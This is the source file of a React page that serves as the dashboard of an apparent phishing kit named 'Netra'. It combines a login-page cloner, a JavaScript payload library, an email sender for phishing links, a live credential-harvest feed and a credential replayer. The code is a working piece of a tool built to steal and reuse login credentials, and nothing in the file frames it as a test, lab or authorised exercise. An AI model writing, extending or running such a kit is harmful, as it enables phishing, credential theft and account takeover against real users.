
'use client';

import { useState, useEffect, useRef } from 'react';
import type { CapturedCredential } from '@/components/credential-harvester';
import { useToast } from '@/hooks/use-toast';
import { CredentialHarvester } from '@/components/credential-harvester';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { Separator } from '@/components/ui/separator';
import { CredentialReplayer } from '@/components/credential-replayer';
import { PREMADE_PAYLOADS } from '@/lib/js-payloads';
import type { JsPayload } from '@/types';
import { logActivity } from '@/services/activity-log-service';
import { useAuth } from '@/hooks/use-auth';
import { EmailSender } from '@/components/email-sender';
import { startNgrokTunnel } from '@/services/ngrok-service';
import { hostPageOnServer } from '@/actions/host-page-action';
import { QrCodeGenerator } from '@/components/qr-code-generator';

const storageKey = 'netra-captured-credentials';

export default function PhishingPage() {
  const { toast } = useToast();
  const { user } = useAuth();
  const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
  
  const defaultPayload = PREMADE_PAYLOADS.find(p => p.name === "Full Recon Payload") || PREMADE_PAYLOADS[0];
  const [selectedPayload, setSelectedPayload] = useState<JsPayload>(defaultPayload);
  
  const [isEmailModalOpen, setIsEmailModalOpen] = useState(false);
  const [hostedUrlForEmail, setHostedUrlForEmail] = useState<string>('');

  const loadCredentialsFromStorage = () => {
    try {
        const storedCreds = localStorage.getItem(storageKey);
        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
    } catch (error) {
        console.error('Failed to load credentials from localStorage', error);
        setCapturedCredentials([]);
    }
  };

  useEffect(() => {
    loadCredentialsFromStorage();

    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === storageKey && event.newValue) {
        try {
            const newCredsList = JSON.parse(event.newValue);
             if(newCredsList.length > capturedCredentials.length) {
                 toast({
                  variant: "destructive",
                  title: "Credentials Captured!",
                  description: "New credentials have been harvested.",
                });
            }
            logActivity({
              user: user?.displayName || 'System',
              action: 'Captured Credentials',
              details: `Harvested from phishing page.`
            });
            setCapturedCredentials(newCredsList);
        } catch (e) {
            console.error('Failed to parse credentials from storage event.', e);
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => {
      window.removeEventListener('storage', handleStorageChange);
    };
  }, [capturedCredentials.length, toast, user]);


  const handleClearCredentials = () => {
    setCapturedCredentials([]);
    localStorage.removeItem(storageKey);
  };
  
  const openEmailModal = (url: string) => {
    setHostedUrlForEmail(url);
    setIsEmailModalOpen(true);
  };

  return (
    <>
      <div className="flex flex-col gap-6">
        <div>
          <h1 className="font-headline text-3xl font-semibold">Page Cloner & Credential Harvester</h1>
          <p className="text-muted-foreground">Clone a login page, inject a harvester, and capture credentials in real-time.</p>
        </div>

        <div className="grid lg:grid-cols-2 gap-6 items-start">
           <div className="lg:col-span-1 flex flex-col gap-6">
            <AdvancedPageCloner selectedPayload={selectedPayload} onSelectPayload={setSelectedPayload} onLinkGenerated={openEmailModal} />
            <JavaScriptLibrary onSelectPayload={setSelectedPayload}/>
          </div>
          
          <div className="flex flex-col gap-6">
            <CredentialHarvester 
              credentials={capturedCredentials} 
              onClear={handleClearCredentials} 
              onRefresh={loadCredentialsFromStorage} 
            />
          </div>
        </div>
        
        <Separator className="my-8" />
        <CredentialReplayer />
      </div>

       <EmailSender
          isOpen={isEmailModalOpen}
          onOpenChange={setIsEmailModalOpen}
          phishingLink={hostedUrlForEmail}
      />
    </>
  );
}
